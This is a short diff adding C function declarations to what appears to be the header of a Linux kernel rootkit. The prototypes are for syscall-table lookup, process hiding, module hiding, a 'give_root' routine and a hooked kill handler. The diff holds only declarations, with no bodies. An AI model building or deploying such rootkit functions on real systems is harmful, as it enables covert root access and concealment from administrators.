@@ -1,3 +1,27 @@
+unsigned long *
+get_syscall_table_bf(void);
+
+struct task_struct *
+find_task(pid_t pid);
+int
+is_invisible(pid_t pid);
+
+void
+give_root(void);
+
+void
+module_show(void);
+
+void
+module_hide(void);
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+asmlinkage int
+hacked_kill(const struct pt_regs *pt_regs);
+#else
+asmlinkage int
+hacked_kill(pid_t pid, int sig);
+#endif
 struct linux_dirent {
         unsigned long   d_ino;
         unsigned long   d_off;
@@ -29,3 +53,4 @@ static struct kprobe kp = {
 	    .symbol_name = "kallsyms_lookup_name"
 };
 #endif
+
